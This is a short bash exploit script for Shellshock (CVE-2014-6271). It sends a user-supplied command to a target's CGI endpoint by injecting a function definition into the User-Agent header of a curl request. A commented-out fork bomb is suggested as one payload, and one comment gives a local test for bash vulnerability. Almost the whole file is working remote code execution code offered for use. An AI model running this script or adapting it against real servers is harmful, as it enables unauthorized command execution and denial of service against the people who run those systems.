#!/bin/bash
#Exploiting CVE-2014-6271 via a vulnerable web cgi entry.
#Cooked by @shawntns

if [ -z "$1" ]
then
    echo 'Please inform the IP, Port and command of the target'
    echo 'Example: ./exploit-cli.sh <ip> <port> <command>'
    return -1
fi

ip=$1
port=$2
command=$3
#Fork Bomb
#command='set -x; :(){ :|:& };:'

#Test your system
#Just run this bash script in your system and you will see if you are vulnerable or not:
#env 'VAR=() { :;}; echo Bash is vulnerable!' 'FUNCTION()=() { :;}; echo Bash is vulnerable!' bash -c "echo Bash Test"

echo '[+] Sending the exploit' && \
echo '--------------------------------------------------------------------------------------------------------------------------------------------------' && \
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c '$command' 2>&1" http://$ip:$port/cgi-bin/vulnerable
echo '\n' && \
echo '--------------------------------------------------------------------------------------------------------------------------------------------------' && \
echo '[+] Done'
